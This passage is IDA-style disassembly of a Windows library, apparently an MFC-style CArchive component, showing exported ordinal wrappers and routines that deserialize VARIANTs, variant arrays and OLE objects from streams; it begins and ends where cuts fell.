Ordinal347	endp

; Exported entry 349.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal349
Ordinal349	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	esi
		push	[ebp+arg_0]
		mov	esi, ecx
		call	Ordinal322
		test	eax, eax
		jnz	short loc_6AF39BA9
		push	offset dword_6AF62908
		lea	eax, [ebp+arg_0]
		push	eax
		mov	[ebp+arg_0], offset off_6AF57464
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF39BA9:				; CODE XREF: Ordinal349+10j
		mov	eax, esi
		pop	esi
		pop	ebp
		retn	4
Ordinal349	endp

; Exported entry 351.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal351
Ordinal351	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	esi
		push	[ebp+arg_0]
		mov	esi, ecx
		call	Ordinal324
		test	eax, eax
		jnz	short loc_6AF39BD7
		push	offset dword_6AF62908
		lea	eax, [ebp+arg_0]
		push	eax
		mov	[ebp+arg_0], offset off_6AF57464
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF39BD7:				; CODE XREF: Ordinal351+10j
		mov	eax, esi
		pop	esi
		pop	ebp
		retn	4
Ordinal351	endp

; Exported entry 353.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal353
Ordinal353	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	esi
		push	[ebp+arg_4]
		mov	esi, ecx
		push	[ebp+arg_0]
		call	Ordinal326
		test	eax, eax
		jnz	short loc_6AF39C08
		push	offset dword_6AF62908
		lea	eax, [ebp+arg_4]
		push	eax
		mov	[ebp+arg_4], offset off_6AF57464
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF39C08:				; CODE XREF: Ordinal353+13j
		mov	eax, esi
		pop	esi
		pop	ebp
		retn	8
Ordinal353	endp

; Exported entry 355.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal355(double)
		public Ordinal355
Ordinal355	proc near		; DATA XREF: .rdata:off_6AF66098o

var_C		= qword	ptr -0Ch
arg_0		= qword	ptr  8

		push	ebp
		mov	ebp, esp
		fld	[ebp+arg_0]
		push	esi
		push	ecx
		push	ecx
		fstp	[esp+0Ch+var_C]
		mov	esi, ecx
		call	Ordinal328
		test	eax, eax
		jnz	short loc_6AF39C3B
		push	offset dword_6AF62908
		lea	eax, [ebp+arg_0+4]
		push	eax
		mov	dword ptr [ebp+arg_0+4], offset	off_6AF57464
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF39C3B:				; CODE XREF: Ordinal355+15j
		mov	eax, esi
		pop	esi
		pop	ebp
		retn	8
Ordinal355	endp

; Exported entry 357.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal357
Ordinal357	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	esi
		push	[ebp+arg_0]
		mov	esi, ecx
		call	Ordinal330
		test	eax, eax
		jnz	short loc_6AF39C69
		push	offset dword_6AF62908
		lea	eax, [ebp+arg_0]
		push	eax
		mov	[ebp+arg_0], offset off_6AF57464
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF39C69:				; CODE XREF: Ordinal357+10j
		mov	eax, esi
		pop	esi
		pop	ebp
		retn	4
Ordinal357	endp

; Exported entry 358.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal358(LPCSTR lpString)
		public Ordinal358
Ordinal358	proc near		; DATA XREF: .rdata:off_6AF66098o

lpString	= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	esi
		push	[ebp+lpString]	; lpString
		mov	esi, ecx
		call	Ordinal336
		test	eax, eax
		jnz	short loc_6AF39C97
		push	offset dword_6AF62908
		lea	eax, [ebp+lpString]
		push	eax
		mov	[ebp+lpString],	offset off_6AF57464
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF39C97:				; CODE XREF: Ordinal358+10j
		mov	eax, esi
		pop	esi
		pop	ebp
		retn	4
Ordinal358	endp

; Exported entry 359.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	Ordinal359(LPCWSTR lpString)
		public Ordinal359
Ordinal359	proc near		; DATA XREF: .rdata:off_6AF66098o

lpString	= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	esi
		push	[ebp+lpString]	; lpString
		mov	esi, ecx
		call	Ordinal339
		test	eax, eax
		jnz	short loc_6AF39CC5
		push	offset dword_6AF62908
		lea	eax, [ebp+lpString]
		push	eax
		mov	[ebp+lpString],	offset off_6AF57464
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF39CC5:				; CODE XREF: Ordinal359+10j
		mov	eax, esi
		pop	esi
		pop	ebp
		retn	4
Ordinal359	endp

; Exported entry 366.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal366
Ordinal366	proc near		; CODE XREF: Ordinal317+8p
					; Ordinal319+8p ...

var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	ecx
		and	[ebp+var_4], 0
		lea	eax, [ebp+var_4]
		push	eax
		push	[ebp+arg_8]
		push	[ebp+arg_4]
		push	[ebp+arg_0]
		call	Ordinal367
		leave
		retn	0Ch
Ordinal366	endp

; Exported entry 381.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal381
Ordinal381	proc near		; CODE XREF: Ordinal373+D5p
					; DATA XREF: .rdata:off_6AF66098o

var_C		= dword	ptr -0Ch
dwBytes		= dword	ptr -8
pStm		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		and	[ebp+var_C], 0
		and	[ebp+dwBytes], 0
		push	ebx
		push	esi
		push	edi
		mov	edi, ecx
		mov	eax, [edi]
		push	4
		lea	ecx, [ebp+dwBytes]
		push	ecx
		mov	ecx, edi
		call	dword ptr [eax+4]
		test	eax, eax
		jnz	short loc_6AF39D1E
		push	offset aCarchiveRead_5 ; "CArchive::ReadVariantObject()	: ReadEx("...
		call	sub_6AF3102E
		pop	ecx
		jmp	loc_6AF39DCF
; ---------------------------------------------------------------------------

loc_6AF39D1E:				; CODE XREF: Ordinal381+22j
		push	[ebp+dwBytes]	; dwBytes
		mov	esi, [ebp+arg_4]
		add	dword ptr [esi], 4
		push	2		; uFlags
		call	ds:GlobalAlloc
		mov	ebx, eax
		test	ebx, ebx
		jnz	short loc_6AF39D3C
		push	offset aCarchiveRead_6 ; "CArchive::ReadVariantObject()	: GlobalA"...
		jmp	short loc_6AF39D4C
; ---------------------------------------------------------------------------

loc_6AF39D3C:				; CODE XREF: Ordinal381+49j
		push	ebx		; hMem
		call	ds:GlobalLock
		test	eax, eax
		jnz	short loc_6AF39D54
		push	offset aCarchiveRead_7 ; "CArchive::ReadVariantObject()	: GlobalL"...

loc_6AF39D4C:				; CODE XREF: Ordinal381+50j
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF39D88
; ---------------------------------------------------------------------------

loc_6AF39D54:				; CODE XREF: Ordinal381+5Bj
		push	[ebp+dwBytes]
		mov	edx, [edi]
		push	eax
		mov	ecx, edi
		call	dword ptr [edx+4]
		xor	edi, edi
		inc	edi
		test	eax, eax
		jnz	short loc_6AF39D73
		push	offset aCarchiveRead_5 ; "CArchive::ReadVariantObject()	: ReadEx("...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF39D7B
; ---------------------------------------------------------------------------

loc_6AF39D73:				; CODE XREF: Ordinal381+7Aj
		mov	eax, [ebp+dwBytes]
		add	[esi], eax
		mov	[ebp+var_C], edi

loc_6AF39D7B:				; CODE XREF: Ordinal381+87j
		push	ebx		; hMem
		call	ds:GlobalUnlock
		cmp	[ebp+var_C], 0
		jnz	short loc_6AF39D95

loc_6AF39D88:				; CODE XREF: Ordinal381+68j
		test	ebx, ebx
		jz	short loc_6AF39DCF
		push	ebx		; hMem
		call	ds:GlobalFree
		jmp	short loc_6AF39DCF
; ---------------------------------------------------------------------------

loc_6AF39D95:				; CODE XREF: Ordinal381+9Cj
		and	[ebp+pStm], 0
		lea	ecx, [ebp+pStm]
		call	sub_6AF399D7
		push	eax		; ppstm
		push	edi		; fDeleteOnRelease
		push	ebx		; hGlobal
		call	ds:CreateStreamOnHGlobal
		test	eax, eax
		jge	short loc_6AF39DD8
		push	eax		; Args
		push	offset aCarchiveRead_8 ; "CArchive::ReadVariantObject()	: CreateS"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		push	ebx		; hMem
		call	ds:GlobalFree

loc_6AF39DC2:				; CODE XREF: Ordinal381+FEj
					; Ordinal381+123j
		mov	eax, [ebp+pStm]
		test	eax, eax
		jz	short loc_6AF39DCF
		mov	ecx, [eax]
		push	eax
		call	dword ptr [ecx+8]

loc_6AF39DCF:				; CODE XREF: Ordinal381+2Fj
					; Ordinal381+A0j ...
		xor	eax, eax

loc_6AF39DD1:				; CODE XREF: Ordinal381+134j
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn	8
; ---------------------------------------------------------------------------

loc_6AF39DD8:				; CODE XREF: Ordinal381+C2j
		mov	eax, [ebp+arg_0]
		mov	cx, [eax]
		cmp	cx, 9
		jz	short loc_6AF39DEA
		cmp	cx, 0Dh
		jnz	short loc_6AF39DC2

loc_6AF39DEA:				; CODE XREF: Ordinal381+F8j
		add	eax, 8
		push	eax		; ppvObj
		push	offset iidInterface ; iidInterface
		push	[ebp+pStm]	; pStm
		call	ds:OleLoadFromStream
		test	eax, eax
		jge	short loc_6AF39E0F
		push	eax		; Args
		push	offset aCarchiveRead_9 ; "CArchive::ReadVariantObject()	: OleLoad"...
		call	sub_6AF3102E
		pop	ecx
		pop	ecx
		jmp	short loc_6AF39DC2
; ---------------------------------------------------------------------------

loc_6AF39E0F:				; CODE XREF: Ordinal381+114j
		mov	eax, [ebp+pStm]
		test	eax, eax
		jz	short loc_6AF39E1C
		mov	ecx, [eax]
		push	eax
		call	dword ptr [ecx+8]

loc_6AF39E1C:				; CODE XREF: Ordinal381+12Aj
		mov	eax, edi
		jmp	short loc_6AF39DD1
Ordinal381	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_6AF39E20	proc near		; CODE XREF: sub_6AF3A221+7p

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_0]
		test	eax, eax
		push	esi
		push	edi
		mov	edi, ecx
		jz	short loc_6AF39E53
		mov	ecx, [eax]
		lea	edx, [ebp+arg_0]
		push	edx
		push	offset dword_6AF57710
		push	eax
		call	dword ptr [ecx]
		mov	esi, eax
		test	esi, esi
		jl	short loc_6AF39E47
		mov	eax, [ebp+arg_0]
		jmp	short loc_6AF39E49
; ---------------------------------------------------------------------------

loc_6AF39E47:				; CODE XREF: sub_6AF39E20+20j
		xor	eax, eax

loc_6AF39E49:				; CODE XREF: sub_6AF39E20+25j
		push	eax
		mov	ecx, edi
		call	sub_6AF396E4
		jmp	short loc_6AF39E61
; ---------------------------------------------------------------------------

loc_6AF39E53:				; CODE XREF: sub_6AF39E20+Cj
		push	0
		mov	ecx, edi
		call	sub_6AF399ED
		mov	esi, 80004002h

loc_6AF39E61:				; CODE XREF: sub_6AF39E20+31j
		pop	edi
		mov	eax, esi
		pop	esi
		pop	ebp
		retn	4
sub_6AF39E20	endp

; Exported entry 317.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal317
Ordinal317	proc near		; CODE XREF: Ordinal296+41p
					; Ordinal299+FEp ...

arg_0		= dword	ptr  4

		push	1
		push	[esp+4+arg_0]
		push	0Ah
		call	Ordinal366
		retn	4
Ordinal317	endp

; Exported entry 319.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal319
Ordinal319	proc near		; CODE XREF: Ordinal299+63p
					; Ordinal346+9p ...

arg_0		= dword	ptr  4

		push	1
		push	[esp+4+arg_0]
		push	1
		call	Ordinal366
		retn	4
Ordinal319	endp

; Exported entry 321.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal321
Ordinal321	proc near		; CODE XREF: Ordinal299+73p
					; Ordinal348+9p ...

arg_0		= dword	ptr  4

		push	2
		push	[esp+4+arg_0]
		push	2
		call	Ordinal366
		retn	4
Ordinal321	endp

; Exported entry 323.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal323
Ordinal323	proc near		; CODE XREF: Ordinal178+7Cp
					; Ordinal178+189p ...

arg_0		= dword	ptr  4

		push	4
		push	[esp+4+arg_0]
		push	3
		call	Ordinal366
		retn	4
Ordinal323	endp

; Exported entry 325.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal325
Ordinal325	proc near		; CODE XREF: Ordinal299+93p
					; Ordinal352+9p ...

arg_0		= dword	ptr  4

		push	8
		push	[esp+4+arg_0]
		push	4
		call	Ordinal366
		retn	4
Ordinal325	endp

; Exported entry 327.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal327
Ordinal327	proc near		; CODE XREF: Ordinal299+A3p
					; Ordinal354+9p ...

arg_0		= dword	ptr  4

		push	8
		push	[esp+4+arg_0]
		push	5
		call	Ordinal366
		retn	4
Ordinal327	endp

; Exported entry 329.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal329
Ordinal329	proc near		; CODE XREF: Ordinal178+46p
					; Ordinal217+3Dp ...

arg_0		= dword	ptr  4

		push	4
		push	[esp+4+arg_0]
		push	6
		call	Ordinal366
		retn	4
Ordinal329	endp

; Exported entry 331.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal331
Ordinal331	proc near		; CODE XREF: Ordinal299+EEp
					; Ordinal299+120p ...

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		push	[esp+arg_4]
		push	[esp+4+arg_0]
		push	9
		call	Ordinal366
		retn	8
Ordinal331	endp

; Exported entry 334.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal334
Ordinal334	proc near		; CODE XREF: Ordinal340+77p
					; Ordinal815j
					; DATA XREF: ...

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		push	[esp+arg_4]
		push	[esp+4+arg_0]
		push	7
		call	Ordinal366
		retn	8
Ordinal334	endp

; Exported entry 337.

; =============== S U B	R O U T	I N E =======================================


		public Ordinal337
Ordinal337	proc near		; CODE XREF: Ordinal341+7Ap
					; Ordinal1456j
					; DATA XREF: ...

arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		push	[esp+arg_4]
		push	[esp+4+arg_0]
		push	8
		call	Ordinal366
		retn	8
Ordinal337	endp

; Exported entry 344.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal344
Ordinal344	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	esi
		push	[ebp+arg_0]
		mov	esi, ecx
		call	Ordinal317
		test	eax, eax
		jnz	short loc_6AF39F36
		push	offset dword_6AF62908
		lea	eax, [ebp+arg_0]
		push	eax
		mov	[ebp+arg_0], offset off_6AF57464
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF39F36:				; CODE XREF: Ordinal344+10j
		mov	eax, esi
		pop	esi
		pop	ebp
		retn	4
Ordinal344	endp

; Exported entry 346.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal346
Ordinal346	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	esi
		push	[ebp+arg_0]
		mov	esi, ecx
		call	Ordinal319
		test	eax, eax
		jnz	short loc_6AF39F64
		push	offset dword_6AF62908
		lea	eax, [ebp+arg_0]
		push	eax
		mov	[ebp+arg_0], offset off_6AF57464
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF39F64:				; CODE XREF: Ordinal346+10j
		mov	eax, esi
		pop	esi
		pop	ebp
		retn	4
Ordinal346	endp

; Exported entry 348.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal348
Ordinal348	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	esi
		push	[ebp+arg_0]
		mov	esi, ecx
		call	Ordinal321
		test	eax, eax
		jnz	short loc_6AF39F92
		push	offset dword_6AF62908
		lea	eax, [ebp+arg_0]
		push	eax
		mov	[ebp+arg_0], offset off_6AF57464
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF39F92:				; CODE XREF: Ordinal348+10j
		mov	eax, esi
		pop	esi
		pop	ebp
		retn	4
Ordinal348	endp

; Exported entry 350.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal350
Ordinal350	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	esi
		push	[ebp+arg_0]
		mov	esi, ecx
		call	Ordinal323
		test	eax, eax
		jnz	short loc_6AF39FC0
		push	offset dword_6AF62908
		lea	eax, [ebp+arg_0]
		push	eax
		mov	[ebp+arg_0], offset off_6AF57464
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF39FC0:				; CODE XREF: Ordinal350+10j
		mov	eax, esi
		pop	esi
		pop	ebp
		retn	4
Ordinal350	endp

; Exported entry 352.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal352
Ordinal352	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	esi
		push	[ebp+arg_0]
		mov	esi, ecx
		call	Ordinal325
		test	eax, eax
		jnz	short loc_6AF39FEE
		push	offset dword_6AF62908
		lea	eax, [ebp+arg_0]
		push	eax
		mov	[ebp+arg_0], offset off_6AF57464
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF39FEE:				; CODE XREF: Ordinal352+10j
		mov	eax, esi
		pop	esi
		pop	ebp
		retn	4
Ordinal352	endp

; Exported entry 354.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal354
Ordinal354	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	esi
		push	[ebp+arg_0]
		mov	esi, ecx
		call	Ordinal327
		test	eax, eax
		jnz	short loc_6AF3A01C
		push	offset dword_6AF62908
		lea	eax, [ebp+arg_0]
		push	eax
		mov	[ebp+arg_0], offset off_6AF57464
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF3A01C:				; CODE XREF: Ordinal354+10j
		mov	eax, esi
		pop	esi
		pop	ebp
		retn	4
Ordinal354	endp

; Exported entry 356.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal356
Ordinal356	proc near		; DATA XREF: .rdata:off_6AF66098o

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	esi
		push	[ebp+arg_0]
		mov	esi, ecx
		call	Ordinal329
		test	eax, eax
		jnz	short loc_6AF3A04A
		push	offset dword_6AF62908
		lea	eax, [ebp+arg_0]
		push	eax
		mov	[ebp+arg_0], offset off_6AF57464
		call	_CxxThrowException
; ---------------------------------------------------------------------------

loc_6AF3A04A:				; CODE XREF: Ordinal356+10j
		mov	eax, esi
		pop	esi
		pop	ebp
		retn	4
Ordinal356	endp

; Exported entry 373.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal373
Ordinal373	proc near		; CODE XREF: Ordinal375+8Ap
					; Ordinal342+76p
					; DATA XREF: ...

pvarg		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ebx
		mov	ebx, [ebp+pvarg]
		push	edi
		push	ebx		; pvarg
		mov	edi, ecx
		call	ds:VariantClear
		mov	eax, [edi]
		and	[ebp+pvarg], 0
		push	2
		push	ebx
		mov	ecx, edi
		call	dword ptr [eax+4]
		test	eax, eax
		jnz	short loc_6AF3A084
		push	offset aCarchiveRea_10 ; "CArchive::ReadVariant() : ReadEx() ==	F"...
		call	sub_6AF3102E
		pop	ecx
		jmp	loc_6AF3A119
; ---------------------------------------------------------------------------

loc_6AF3A084:				; CODE XREF: Ordinal373+21j
		push	esi		; Args
		mov	esi, [ebp+arg_4]
		add	dword ptr [esi], 2
		mov	ax, [ebx]
		test	ah, 20h
		mov	cl, al
		jz	short loc_6AF3A0D1
		and	cl, 11h
		cmp	cl, 11h
		jnz	short loc_6AF3A0B7
		push	esi
		push	ebx
		mov	ecx, edi
		call	Ordinal377
		test	eax, eax
		jnz	short loc_6AF3A111
		push	offset aCarchiveRea_11 ; "CArchive::ReadVariant() : ReadVariantBu"...

loc_6AF3A0AF:				; CODE XREF: Ordinal373+7Ej
					; Ordinal373+A8j ...
		call	sub_6AF3102E
		pop	ecx
		jmp	short loc_6AF3A118
; ---------------------------------------------------------------------------

loc_6AF3A0B7:				; CODE XREF: Ordinal373+4Aj
		and	al, 0Ch
		cmp	al, 0Ch
		jnz	short loc_6AF3A111
		push	esi
		push	ebx
		mov	ecx, edi
		call	Ordinal375
		test	eax, eax
		jnz	short loc_6AF3A111
		push	offset aCarchiveRea_12 ; "CArchive::ReadVariant() : ReadVariantAr"...
		jmp	short loc_6AF3A0AF
; ---------------------------------------------------------------------------

loc_6AF3A0D1:				; CODE XREF: Ordinal373+42j
		and	cl, 9
		cmp	cl, 9
		jz	short loc_6AF3A122
		mov	cl, al
		and	cl, 0Dh
		cmp	cl, 0Dh
		jz	short loc_6AF3A122
		test	al, 8
		mov	ecx, edi
		jz	short loc_6AF3A0FB
		push	esi
		push	ebx
		call	Ordinal379
		test	eax, eax
		jnz	short loc_6AF3A111
		push	offset aCarchiveRea_13 ; "CArchive::ReadVariant() : ReadVariantSt"...
		jmp	short loc_6AF3A0AF
; ---------------------------------------------------------------------------

loc_6AF3A0FB:				; CODE XREF: Ordinal373+96j
		mov	eax, [edi]
		push	10h
		push	ebx
		call	dword ptr [eax+4]
		test	eax, eax
		jnz	short loc_6AF3A10E
		push	offset aCarchiveRea_10 ; "CArchive::ReadVariant() : ReadEx() ==	F"...
		jmp	short loc_6AF3A0AF
; ---------------------------------------------------------------------------

loc_6AF3A10E:				; CODE XREF: Ordinal373+B4j
		add	dword ptr [esi], 10h

loc_6AF3A111:				; CODE XREF: Ordinal373+57j
					; Ordinal373+6Aj ...
		mov	[ebp+pvarg], 1

loc_6AF3A118:				; CODE XREF: Ordinal373+64j
		pop	esi

loc_6AF3A119:				; CODE XREF: Ordinal373+2Ej
		mov	eax, [ebp+pvarg]
		pop	edi
		pop	ebx
		pop	ebp
		retn	8
; ---------------------------------------------------------------------------

loc_6AF3A122:				; CODE XREF: Ordinal373+86j
					; Ordinal373+90j
		push	esi
		push	ebx
		mov	ecx, edi
		call	Ordinal381
		test	eax, eax
		jnz	short loc_6AF3A111
		push	offset aCarchiveRea_14 ; "CArchive::ReadVariant() : ReadVariantOb"...
		jmp	loc_6AF3A0AF
Ordinal373	endp

; Exported entry 375.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal375
Ordinal375	proc near		; CODE XREF: Ordinal373+70p
					; DATA XREF: .rdata:off_6AF66098o

var_28		= byte ptr -28h
var_8		= dword	ptr -8
var_4		= dword	ptr -4
pvarg		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 28h
		push	ebx
		push	esi
		mov	esi, ecx
		lea	ecx, [ebp+var_28]
		call	Ordinal1467
		mov	eax, [esi]
		push	4
		lea	ecx, [ebp+var_8]
		xor	ebx, ebx
		push	ecx
		mov	ecx, esi
		mov	[ebp+var_4], ebx
		mov	[ebp+var_8], ebx
		call	dword ptr [eax+4]
		test	eax, eax
		jnz	short loc_6AF3A174
		push	offset aCarchiveRea_15 ; "CArchive::ReadVariantArray() : ReadEx()"...
		call	sub_6AF3102E
		pop	ecx
		jmp	loc_6AF3A210
; ---------------------------------------------------------------------------

loc_6AF3A174:				; CODE XREF: Ordinal375+29j
		push	edi		; Args
		mov	edi, [ebp+arg_4]
		push	[ebp+var_8]
		add	dword ptr [edi], 4
		lea	ecx, [ebp+var_28]
		call	Ordinal1475
		test	eax, eax
		jnz	short loc_6AF3A191
		push	offset aCarchiveRea_16 ; "CArchive::ReadVariantArray() : varArray"...
		jmp	short loc_6AF3A1A2
; ---------------------------------------------------------------------------

loc_6AF3A191:				; CODE XREF: Ordinal375+4Fj
		lea	ecx, [ebp+var_28]
		call	Ordinal1488
		test	eax, eax
		jnz	short loc_6AF3A1A9
		push	offset aCarchiveRea_17 ; "CArchive::ReadVariantArray() : varArray"...

loc_6AF3A1A2:				; CODE XREF: Ordinal375+56j
		call	sub_6AF3102E
		jmp	short loc_6AF3A20E
; ---------------------------------------------------------------------------

loc_6AF3A1A9:				; CODE XREF: Ordinal375+62j
		cmp	[ebp+var_8], 0
		mov	[ebp+var_4], 1
		jbe	short loc_6AF3A1E3

loc_6AF3A1B6:				; CODE XREF: Ordinal375+97j
		push	ebx		; rgIndices
		lea	ecx, [ebp+var_28]
		call	Ordinal1487
		push	edi
		push	eax
		mov	ecx, esi
		call	Ordinal373
		test	eax, eax
		jz	short loc_6AF3A1D4
		inc	ebx
		cmp	ebx, [ebp+var_8]
		jb	short loc_6AF3A1B6
		jmp	short loc_6AF3A1E3
; ---------------------------------------------------------------------------

loc_6AF3A1D4:				; CODE XREF: Ordinal375+91j
		push	offset aCarchiveRea_18 ; "CArchive::ReadVariantArray() : ReadVari"...
		call	sub_6AF3102E
		and	[ebp+var_4], 0
		pop	ecx

loc_6AF3A1E3:				; CODE XREF: Ordinal375+7Bj
					; Ordinal375+99j
		lea	ecx, [ebp+var_28]
		call	Ordinal1489
		cmp	[ebp+var_4], 0
		jz	short loc_6AF3A20F
		push	[ebp+pvarg]	; pvarg
		lea	ecx, [ebp+var_28]
		call	Ordinal1481
		test	eax, eax
		jnz	short loc_6AF3A20F
		push	offset aCarchiveRea_19 ; "CArchive::ReadVariantArray() : varArray"...
		call	sub_6AF3102E
		and	[ebp+var_4], 0

loc_6AF3A20E:				; CODE XREF: Ordinal375+6Ej
		pop	ecx

loc_6AF3A20F:				; CODE XREF: Ordinal375+B6j
					; Ordinal375+C5j
		pop	edi

loc_6AF3A210:				; CODE XREF: Ordinal375+36j
		lea	ecx, [ebp+var_28]
		call	Ordinal1470
		mov	eax, [ebp+var_4]
		pop	esi
		pop	ebx
		leave
		retn	8
Ordinal375	endp


; =============== S U B	R O U T	I N E =======================================


sub_6AF3A221	proc near		; CODE XREF: Ordinal371+E9p
					; Ordinal371+FCp ...

arg_0		= dword	ptr  4

		push	esi
		push	[esp+4+arg_0]
		mov	esi, ecx
		call	sub_6AF39E20
		test	eax, eax
		jge	short loc_6AF3A23E
		cmp	eax, 80004002h
		jz	short loc_6AF3A23E
		push	eax
		call	sub_6AF52C60
; ---------------------------------------------------------------------------

loc_6AF3A23E:				; CODE XREF: sub_6AF3A221+Ej
					; sub_6AF3A221+15j
		mov	eax, esi
		pop	esi
		retn	4
sub_6AF3A221	endp

; Exported entry 342.

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

		public Ordinal342
Ordinal342	proc near		; CODE XREF: Ordinal299+10Ep
					; Ordinal362+9p ...

var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_1		= byte ptr -1
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 0Ch
		push	esi
		mov	esi, ecx
		cmp	dword ptr [esi+10h], 1
		jz	short loc_6AF3A265
		push	offset aCarchiveReadLp ; "CArchive::Read(LPVARIANT) : m_eArchiveT"...
		call	sub_6AF3102E
		pop	ecx
		xor	eax, eax
		jmp	loc_6AF3A2F0
; ---------------------------------------------------------------------------

loc_6AF3A265:				; CODE XREF: Ordinal342+Dj
		mov	eax, [esi]
		push	edi		; Args
		push	1
		lea	ecx, [ebp+var_1]
		push	ecx
		mov	ecx, esi
		xor	edi, edi
		mov	[ebp+var_1], 0
		call	dword ptr [eax+4]
		test	eax, eax
		jnz	short loc_6AF3A284
		push	offset aCarchiveRea_20 ; "CArchive::Read(LPVARIANT) : ReadEx() =="...
		jmp	short loc_6AF3A2C8
; ---------------------------------------------------------------------------

loc_6AF3A284:				; CODE XREF: Ordinal342+37j
		cmp	[ebp+var_1], 0Bh
		jz	short loc_6AF3A291
		push	offset aCarchiveRea_21 ; "CArchive::Read(LPVARIANT) : eReadType	!"...
		jmp	short loc_6AF3A2C8
; ---------------------------------------------------------------------------

loc_6AF3A291:				; CODE XREF: Ordinal342+44j
		mov	eax, [esi]
		and	[ebp+var_C], 0
		push	4
		lea	ecx, [ebp+var_C]
		push	ecx
		mov	ecx, esi
		call	dword ptr [eax+4]
		test	eax, eax
		jnz	short loc_6AF3A2AD
		push	offset aCarchiveRea_22 ; "CArchive::Read(LPCVARIANT) : ReadEx()	="...
		jmp	short loc_6AF3A2C8
; ---------------------------------------------------------------------------

loc_6AF3A2AD:				; CODE XREF: Ordinal342+60j
		and	[ebp+var_8], 0
		lea	eax, [ebp+var_8]
		push	eax
		push	[ebp+arg_0]
		mov	ecx, esi
		call	Ordinal373
		test	eax, eax
